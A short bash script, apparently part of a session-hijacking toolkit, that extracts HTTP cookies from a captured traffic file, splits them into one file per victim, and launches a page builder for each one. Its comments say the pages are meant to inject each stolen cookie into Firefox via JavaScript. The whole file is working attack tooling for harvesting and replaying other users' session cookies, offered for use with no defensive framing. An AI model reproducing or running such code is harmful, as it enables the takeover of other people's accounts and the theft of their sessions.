
# input is [ThisRoundTempFile]
export ThisRoundFile="$1"
# usage : ./CookieDigging [ThisRoundTempFile]


#### "Now let's Take the captured file after 10 sec and
#### Analyise it to find how many users has been captured
#### after that we will bulid a cookie and a html page
#### for each user to use it as a GUI to inject the cookie
#### by javascript into firefox browser" >> Says:Noras Salman

############# Digging the cookies out ##################
declare -a userId #array of user ids
cookies=$(cat $ThisRoundFile | grep -oE "http.cookie.*" | sort -u)
(cat $ThisRoundFile | grep -oE "http.cookie.*" | sort -u)>cookies.txt
######## How Many Users is there in this file??  ######
lineNum=1
line=$(head -n 1 cookies.txt)
lineLength=$(echo ${#line})
if [ $lineLength -eq 0 ] ;then
	echo "there is no cookie in this file"
	rm $ThisRoundFile
	rm cookies.txt
	exit ## there is no cookie in this file
fi 
echo "line number $lineNum length is $lineLength"

currentIndex=0
echo ${cookies:currentIndex:lineLength}>cookie1.txt 
currentIndex=$lineLength
#there is one cookie let's see if there is more
while [ $lineLength != 0 ]
do
	counter=$[$lineNum+1]
	lineNum=$counter
	echo ${cookies:currentIndex}>cookie$lineNum.txt #next cookie is?
	line=$(head -n 1 cookie$lineNum.txt)
	lineLength=$(echo ${#line})
	now=$[$currentIndex+lineLength+1]
	currentIndex=$now
	echo "line number $lineNum length is $lineLength"
done
rm cookie$lineNum.txt
numOfCookiesInFile=$[$lineNum-1]
echo  "There is $numOfCookiesInFile in the captured file"
###########################################################
## for each cookie file analyse and bulid a page
i="0"
while [ $i -lt $numOfCookiesInFile ]
do
fnum=$[$i+1]
xterm -e "./../../../PageBulid cookie$fnum.txt"&
i=$[$i+1]
done
  
